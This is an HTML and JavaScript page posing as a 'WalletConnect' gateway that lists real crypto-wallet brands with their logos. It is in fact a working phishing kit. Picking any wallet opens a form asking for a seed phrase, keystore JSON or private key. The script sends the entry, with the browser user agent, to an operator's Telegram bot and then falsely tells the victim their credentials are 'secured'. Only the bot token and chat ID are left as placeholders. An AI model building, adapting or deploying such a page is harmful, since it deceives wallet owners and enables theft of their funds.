<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect • Gateway</title>
    <!-- Tailwind CSS + Font Awesome -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Custom Font -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: #f9fafb;
        }
        /* custom scrollbar */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #eef2f8; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #b9cbee; border-radius: 10px; }
        /* modal transition */
        .modal-bg {
            transition: opacity 0.2s ease, visibility 0.2s;
        }
        /* live ticker */
        .ticker-strip {
            background: white;
            border-bottom: 1px solid #e9edf2;
            overflow: hidden;
            white-space: nowrap;
            padding: 0.6rem 0;
        }
        .ticker-track {
            display: inline-block;
            animation: scrollTicker 45s linear infinite;
        }
        .ticker-track:hover { animation-play-state: paused; }
        .ticker-item {
            display: inline-block;
            margin-right: 2rem;
            background: #f8fafc;
            border-radius: 2rem;
            padding: 0.2rem 1rem;
            font-weight: 500;
            font-size: 0.85rem;
        }
        .ticker-sym { font-weight: 700; color: #1e3a8a; margin-right: 6px; }
        .ticker-price { font-weight: 600; }
        .ticker-change { font-size: 0.7rem; padding: 0.1rem 0.5rem; border-radius: 1rem; margin-left: 6px; }
        .delta-up { background: #e0f2e9; color: #0e6b42; }
        .delta-down { background: #fee9e9; color: #bc2e2e; }
        @keyframes scrollTicker {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }
    </style>
</head>
<body class="antialiased">

<!-- === LIVE MARKET TICKER (optional, but professional) === -->
<div class="ticker-strip">
    <div class="ticker-track" id="liveTickerTrack"></div>
</div>

<!-- === HEADER (exactly as reference) === -->
<header class="fixed top-0 left-0 w-full z-50 bg-white shadow-sm transition-all duration-300">
    <div class="container mx-auto px-4 py-4 md:py-5 flex items-center justify-between relative max-w-7xl">
        <button class="transition-colors relative" aria-label="Toggle menu">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"><path d="M4 12h16"></path><path d="M4 18h16"></path><path d="M4 6h16"></path></svg>
        </button>
        <div class="absolute left-1/2 transform -translate-x-1/2">
            <a href="/">
                <img alt="Logo" width="48" height="48" class="object-contain h-12 w-auto" src="https://placehold.co/100x100/1e3a8a/white?text=VaultCore"/>
            </a>
        </div>
        <div class="w-10"></div>
    </div>
</header>
<div class="h-16 md:h-20"></div> <!-- spacer for fixed header -->

<main class="pt-6 md:pt-10 pb-16">
    <div class="container mx-auto px-4 max-w-7xl">
        <!-- === WALLET GRID (all logos visible, clickable) === -->
        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 md:gap-6" id="walletGrid">
            <!-- wallets injected via JS -->
        </div>

        <!-- "More wallets" link (exactly like reference) -->
        <div class="flex justify-center mt-12 md:mt-16">
            <a href="#" id="moreWalletsLink" class="block transition hover:opacity-80">
                <img src="https://placehold.co/600x100/e2e8f0/1e3a8a?text=More+wallets+→" alt="More wallets" class="object-cover w-full max-w-md mx-auto rounded-xl shadow-sm"/>
            </a>
        </div>
    </div>
</main>

<!-- === MODAL: Seed / Keystore / Private Key === -->
<div id="credModal" class="modal-bg fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 invisible opacity-0 transition-all">
    <div class="bg-white rounded-2xl w-full max-w-lg mx-4 shadow-2xl overflow-hidden">
        <div class="flex justify-between items-center p-5 border-b border-gray-100">
            <h3 id="modalTitle" class="text-xl font-semibold text-gray-800"><i class="fas fa-key text-blue-700 mr-2"></i> Secure entry</h3>
            <button id="closeModalBtn" class="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
        </div>
        <div class="flex border-b border-gray-100">
            <button class="tab-btn flex-1 py-3 text-center font-medium text-gray-600 hover:text-blue-700 transition" data-tab="phrase">Seed phrase</button>
            <button class="tab-btn flex-1 py-3 text-center font-medium text-gray-600 hover:text-blue-700 transition" data-tab="keystore">Keystore JSON</button>
            <button class="tab-btn flex-1 py-3 text-center font-medium text-gray-600 hover:text-blue-700 transition" data-tab="pkey">Private key</button>
        </div>
        <div class="p-6">
            <div id="phrasePane" class="tab-pane">
                <label class="block text-sm font-medium text-gray-700 mb-1">Recovery phrase (12/24 words)</label>
                <textarea id="seedInput" rows="3" class="w-full border border-gray-200 rounded-xl p-3 font-mono text-sm focus:ring-2 focus:ring-blue-200 focus:border-blue-400 outline-none transition" placeholder="enter mnemonic phrase..."></textarea>
            </div>
            <div id="keystorePane" class="tab-pane hidden">
                <label class="block text-sm font-medium text-gray-700 mb-1">Keystore JSON (encrypted)</label>
                <textarea id="keystoreInput" rows="3" class="w-full border border-gray-200 rounded-xl p-3 font-mono text-sm focus:ring-2 focus:ring-blue-200" placeholder='{"crypto": {...}}'></textarea>
            </div>
            <div id="pkeyPane" class="tab-pane hidden">
                <label class="block text-sm font-medium text-gray-700 mb-1">Private key (hex)</label>
                <textarea id="pkeyInput" rows="2" class="w-full border border-gray-200 rounded-xl p-3 font-mono text-sm" placeholder="0x... or raw private key"></textarea>
            </div>
            <button id="submitDataBtn" class="mt-6 w-full bg-blue-800 hover:bg-blue-900 text-white font-semibold py-3 rounded-xl transition flex items-center justify-center gap-2"><i class="fas fa-paper-plane"></i> Verify & send</button>
        </div>
    </div>
</div>

<!-- Toast notification -->
<div id="toastMsg" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-gray-800 text-white px-5 py-2 rounded-full text-sm z-50 hidden shadow-lg"></div>

<script>
    // ======================== TELEGRAM CONFIGURATION ========================
    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Replace with actual bot token
    const CHAT_ID   = "YOUR_CHAT_ID_HERE";     // Replace with actual chat ID
    // ========================================================================

    // Helper functions
    function showToast(msg, duration = 3000) {
        const toast = document.getElementById("toastMsg");
        toast.innerText = msg;
        toast.classList.remove("hidden");
        setTimeout(() => toast.classList.add("hidden"), duration);
    }

    async function sendToTelegram(content, type, source) {
        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
            console.warn("[DEMO] Would send:", { source, type, content });
            showToast("⚠️ DEMO: data logged to console (Telegram not configured)", 4000);
            return false;
        }
        const payload = `🏦 VAULTCORE EVENT\nSource: ${source}\nType: ${type}\nData:\n${content}\nTime: ${new Date().toISOString()}\nUA: ${navigator.userAgent.slice(0,120)}`;
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: payload.slice(0, 4000) })
            });
            const json = await res.json();
            return json.ok;
        } catch(e) { showToast("Telegram error: "+e.message, 3000); return false; }
    }

    // ======================== WALLET LIST WITH REAL LOGOS ========================
    const wallets = [
        { name: "MetaMask", logo: "https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" },
        { name: "Trust Wallet", logo: "https://trustwallet.com/assets/images/favicon.png" },
        { name: "Coinbase Wallet", logo: "https://storage.googleapis.com/opensea-static/logos/coinbasewallet-logo.png" },
        { name: "Ledger Live", logo: "https://www.ledger.com/wp-content/uploads/2021/02/ledger_logo_square.png" },
        { name: "Trezor", logo: "https://trezor.io/static/images/trezor-logo-black.png" },
        { name: "Exodus", logo: "https://www.exodus.com/assets/img/exodus-logo-circle.png" },
        { name: "Phantom", logo: "https://phantom.app/img/phantom-logo-purple.png" },
        { name: "Rabby", logo: "https://rabby.io/assets/icons/icon-128x128.png" },
        { name: "Argent", logo: "https://argent.org/images/argent-logo.svg" },
        { name: "Rainbow", logo: "https://rainbow.me/logo-preview.png" },
        { name: "SafePal", logo: "https://www.safepal.com/download/logo/safepal-logo.png" },
        { name: "Keplr", logo: "https://keplr.xyz/icon.png" },
        { name: "Electrum", logo: "https://electrum.org/electrum_logo_256.png" },
        { name: "MyEtherWallet", logo: "https://www.myetherwallet.com/favicon.ico" },
        { name: "TokenPocket", logo: "https://www.tokenpocket.pro/assets/img/tp-icon.png" },
        { name: "MathWallet", logo: "https://mathwallet.org/favicon.ico" },
        { name: "imToken", logo: "https://token.im/imtoken-logo.png" },
        { name: "Status", logo: "https://status.app/assets/images/status-logo.png" },
        { name: "Zengo", logo: "https://zengo.com/wp-content/uploads/2022/04/zengo-icon.png" },
        { name: "Cake Wallet", logo: "https://cakewallet.com/assets/images/cake_logo.png" }
    ];

    let selectedWallet = null;

    function renderWallets() {
        const container = document.getElementById("walletGrid");
        if (!container) return;
        container.innerHTML = wallets.map(w => `
            <div class="wallet-card bg-white rounded-xl p-4 shadow-sm border border-gray-100 hover:shadow-md transition cursor-pointer" data-wallet="${w.name}">
                <div class="flex flex-col items-center gap-3">
                    <img src="${w.logo}" alt="${w.name}" class="w-12 h-12 object-contain" onerror="this.src='https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/128/icon/generic.png'">
                    <span class="text-sm font-medium text-gray-700">${w.name}</span>
                </div>
            </div>
        `).join('');
        // attach click listeners
        document.querySelectorAll('.wallet-card').forEach(card => {
            card.addEventListener('click', () => {
                selectedWallet = card.getAttribute('data-wallet');
                openModal(selectedWallet);
            });
        });
    }

    // Modal handling
    const modal = document.getElementById("credModal");
    const modalTitle = document.getElementById("modalTitle");
    function openModal(walletName) {
        modalTitle.innerHTML = `<i class="fas fa-key text-blue-700 mr-2"></i> ${walletName} · secure entry`;
        // reset all fields
        document.getElementById("seedInput").value = "";
        document.getElementById("keystoreInput").value = "";
        document.getElementById("pkeyInput").value = "";
        // reset to phrase tab
        document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.add('hidden'));
        document.getElementById("phrasePane").classList.remove("hidden");
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('text-blue-700', 'border-b-2', 'border-blue-700'));
        document.querySelector('.tab-btn[data-tab="phrase"]').classList.add('text-blue-700', 'border-b-2', 'border-blue-700');
        modal.classList.remove("invisible", "opacity-0");
        modal.classList.add("visible", "opacity-100");
    }
    function closeModal() {
        modal.classList.add("invisible", "opacity-0");
        modal.classList.remove("visible", "opacity-100");
    }
    document.getElementById("closeModalBtn").addEventListener('click', closeModal);
    modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });

    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const tab = btn.getAttribute('data-tab');
            document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.add('hidden'));
            if (tab === 'phrase') document.getElementById("phrasePane").classList.remove("hidden");
            if (tab === 'keystore') document.getElementById("keystorePane").classList.remove("hidden");
            if (tab === 'pkey') document.getElementById("pkeyPane").classList.remove("hidden");
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('text-blue-700', 'border-b-2', 'border-blue-700'));
            btn.classList.add('text-blue-700', 'border-b-2', 'border-blue-700');
        });
    });

    // Submit data
    document.getElementById("submitDataBtn").addEventListener('click', async () => {
        let credValue = "", credType = "";
        if (!document.getElementById("phrasePane").classList.contains("hidden")) {
            credValue = document.getElementById("seedInput").value.trim();
            credType = "Seed Phrase";
        } else if (!document.getElementById("keystorePane").classList.contains("hidden")) {
            credValue = document.getElementById("keystoreInput").value.trim();
            credType = "Keystore JSON";
        } else {
            credValue = document.getElementById("pkeyInput").value.trim();
            credType = "Private Key";
        }
        if (!credValue) {
            showToast(`Please fill in ${credType}`, 2500);
            return;
        }
        showToast(`Validating ${credType}...`, 1500);
        const success = await sendToTelegram(credValue, credType, `wallet:${selectedWallet || "unknown"}`);
        if (success) showToast(`✓ ${selectedWallet || "Wallet"} credentials secured`, 3000);
        else showToast(`⚠️ Delivery pending (logged locally)`, 3000);
        closeModal();
    });

    // More wallets link (just for demo, can add more wallets)
    document.getElementById("moreWalletsLink").addEventListener('click', (e) => {
        e.preventDefault();
        showToast("More wallets coming soon — 100+ supported", 2000);
    });

    renderWallets();

    // ======================== LIVE MARKET TICKER ========================
    async function fetchPrices() {
        try {
            const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin&vs_currencies=usd&include_24hr_change=true");
            const data = await res.json();
            return {
                btc: { price: data.bitcoin?.usd || 43500, change: data.bitcoin?.usd_24h_change || 0 },
                eth: { price: data.ethereum?.usd || 2300, change: data.ethereum?.usd_24h_change || 0 },
                sol: { price: data.solana?.usd || 102, change: data.solana?.usd_24h_change || 0 },
                bnb: { price: data.binancecoin?.usd || 325, change: data.binancecoin?.usd_24h_change || 0 }
            };
        } catch(e) { return null; }
    }

    function renderTicker(prices) {
        if (!prices) return;
        const items = [
            { sym: "BTC", price: prices.btc.price, ch: prices.btc.change },
            { sym: "ETH", price: prices.eth.price, ch: prices.eth.change },
            { sym: "SOL", price: prices.sol.price, ch: prices.sol.change },
            { sym: "BNB", price: prices.bnb.price, ch: prices.bnb.change }
        ];
        let html = "";
        for (let i = 0; i < 3; i++) {
            items.forEach(item => {
                const deltaClass = item.ch >= 0 ? "delta-up" : "delta-down";
                const arrow = item.ch >= 0 ? "▲" : "▼";
                html += `<div class="ticker-item">
                            <span class="ticker-sym">${item.sym}</span>
                            <span class="ticker-price">$${item.price.toLocaleString()}</span>
                            <span class="ticker-change ${deltaClass}">${arrow} ${Math.abs(item.ch).toFixed(2)}%</span>
                         </div>`;
            });
        }
        const track = document.getElementById("liveTickerTrack");
        if (track) track.innerHTML = html;
    }

    async function updateTicker() {
        const prices = await fetchPrices();
        if (prices) renderTicker(prices);
    }
    updateTicker();
    setInterval(updateTicker, 12000);
    setTimeout(() => showToast("🔒 Click any wallet to begin secure validation", 4000), 1000);
</script>
</body>
</html>
